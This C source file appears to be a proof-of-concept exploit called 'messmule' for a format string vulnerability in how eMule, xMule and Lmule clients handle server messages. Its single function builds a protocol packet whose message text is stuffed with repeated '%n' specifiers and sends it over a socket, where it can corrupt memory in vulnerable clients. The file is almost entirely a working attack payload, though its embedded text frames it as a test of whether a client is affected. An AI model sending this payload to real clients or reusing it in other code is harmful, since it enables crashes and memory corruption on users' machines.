
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;






typedef char uint8_t ;
typedef int buf ;


 int send (int,char*,int,int ) ;

int
send_server_message (int fd )
{




 uint8_t buf[] =
  "\xE3"
  "\x70\x01\x00\x00"
  "\x38"
  "\x6D\x01"
  "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n"
  "Welcome to messmule, a proof-of-concept for:\n"
  "eMule/xMule/Lmule OP_SERVERMESSAGE\n"
  "Format String Vulnerability\n"
  "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n"
  "If you can read this message from your Server info box,\n"
  "your client is probably not affected by that vulnerability.\n"
  "%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n"
  ;

 return (send (fd, buf, sizeof (buf) - 1, 0) != (sizeof (buf) - 1));
}
